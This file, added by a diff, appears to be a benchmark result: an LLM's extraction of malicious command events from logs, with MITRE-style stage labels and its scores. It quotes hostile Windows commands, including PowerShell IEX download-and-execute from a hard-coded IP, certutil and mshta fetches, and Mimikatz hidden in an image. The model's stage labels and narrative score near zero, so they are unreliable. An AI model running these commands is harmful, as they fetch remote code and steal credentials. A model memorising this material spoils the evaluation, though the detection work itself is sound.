@@ -1,0 +1,111 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\rsync.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /C start C:\\\\.\\pipe\\TestSVC",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "'powershell.exe'' -ExecutionPolicy Bypass -C ''IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'''",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "CertUtil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_3ggsqpbw.vxc.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\lbfowsgp\\lbfowsgp.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application/json ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "This is an Advanced Phishing Attack where attackers inject malicious scripts using CertUtil and execute PowerShell commands via the Microsoft Edge web browser to establish remote access to the target machine.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 170455,
+      "completion_tokens": 4601,
+      "total_tokens": 175056,
+      "wall_clock_s": 54.396,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.06666666666666667,
+      "recall": 0.043478260869565216,
+      "f1": 0.052631578947368425,
+      "tp": 1,
+      "fp": 14,
+      "fn": 22
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 15,
+      "fn": 23,
+      "recall_partial": 0.021739130434782608
+    },
+    "hallucination_rate": 0.19047619047619047,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 170455,
+      "completion_tokens": 4601,
+      "total_tokens": 175056,
+      "wall_clock_s": 54.396,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
